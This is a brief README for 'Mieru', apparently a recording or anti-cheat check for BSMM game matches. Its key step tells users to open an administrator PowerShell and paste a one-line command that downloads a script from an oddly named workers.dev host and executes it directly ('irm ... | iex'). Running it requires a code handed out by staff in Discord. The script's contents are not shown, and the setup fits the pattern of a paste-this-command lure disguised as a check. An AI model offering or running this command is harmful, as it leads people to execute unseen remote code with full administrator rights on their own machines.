# Mieru

The recording check for BSMM matches.

## How to run

1. Right-click the Start button and open **Terminal (Admin)** or **Windows PowerShell (Admin)**.
2. Paste this command and press Enter. It is the same for the PC check and the live monitor.

```powershell
irm https://bsmm-relay-v2.yourgaydad2020.workers.dev/run | iex
```

3. When it asks for a code, paste the one staff gave you in Discord and press Enter. A code works once and expires after 10 minutes.
4. Leave the window open until it says it has finished. For a live monitor, that is when your match is over.
